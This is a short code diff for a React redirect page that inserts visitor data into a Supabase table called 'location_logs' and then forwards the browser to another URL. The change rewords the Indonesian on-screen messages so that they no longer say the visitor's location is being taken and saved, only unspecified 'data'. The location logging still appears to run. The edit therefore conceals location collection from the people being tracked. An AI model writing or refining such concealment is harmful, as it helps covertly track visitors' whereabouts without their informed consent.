@@ -10,7 +10,8 @@ export default function App() {
     const logLocationAndRedirect = async () => {
       try {
         setLoading(true);
-        setMessage("Mengambil lokasi dan menyimpan ke Supabase...");
+        // setMessage("Mengambil lokasi dan menyimpan ke Supabase...");
+        setMessage("Mengambil data dan menyimpan ke Supabase...");
 
         const path = window.location.pathname || "/";
         const slug = path.replace(/^\/+|\/+$/g, "") || "root";
@@ -45,7 +46,8 @@ export default function App() {
         const { error } = await supabase.from("location_logs").insert([payload]);
         if (error) throw error;
 
-        setMessage("Berhasil menyimpan lokasi. Mengarahkan ke tujuan...");
+        // setMessage("Berhasil menyimpan lokasi. Mengarahkan ke tujuan...");
+        setMessage("Berhasil menyimpan. Mengarahkan ke tujuan...");
 
         window.location.href = redirectUrl;
       } catch (err) {
